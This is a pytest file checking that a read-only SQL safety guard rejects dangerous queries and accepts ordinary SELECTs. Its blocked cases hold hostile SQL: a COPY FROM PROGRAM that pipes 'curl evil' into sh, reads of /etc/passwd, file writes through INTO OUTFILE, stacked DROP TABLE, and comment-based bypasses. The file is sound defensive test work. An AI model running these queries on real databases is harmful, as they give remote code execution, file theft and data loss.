import pytest

from app.core.safety import SafetyGuard, SafetyLevel

RO = SafetyGuard(SafetyLevel.READ_ONLY)


@pytest.mark.parametrize(
    "q",
    [
        "COPY users FROM PROGRAM 'curl evil|sh'",  # PG RCE
        "COPY (SELECT * FROM users) TO PROGRAM 'id'",
        "COPY users FROM '/etc/passwd'",
        "SELECT * FROM users INTO OUTFILE '/tmp/x'",  # MySQL file write
        "SELECT * INTO DUMPFILE '/tmp/x' FROM t",
        "LOAD DATA INFILE '/etc/passwd' INTO TABLE t",
        "REPLACE INTO users VALUES (1)",
        "CALL do_something()",
        "DO $$ BEGIN PERFORM 1; END $$",
        "DELETE/**/FROM users",  # comment-separator bypass
        "DELETE /* x */ FROM users",
        "SELECT 1; DROP TABLE users",  # stacked
        "INSERT/**/INTO users VALUES (1)",
    ],
)
def test_blocks_dangerous_and_bypasses(q):
    assert RO.validate(q, "postgres").is_safe is False


@pytest.mark.parametrize(
    "q",
    [
        "SELECT * FROM users WHERE id = 1",
        "SELECT copy FROM settings",  # 'copy' as an identifier must NOT be blocked
        "SELECT call_count FROM metrics",  # 'call' substring must NOT be blocked
        "WITH t AS (SELECT 1 AS n) SELECT * FROM t",
        "SELECT REPLACE(name, 'a', 'b') FROM users",  # REPLACE() function is fine
    ],
)
def test_allows_legitimate_selects(q):
    assert RO.validate(q, "postgres").is_safe is True
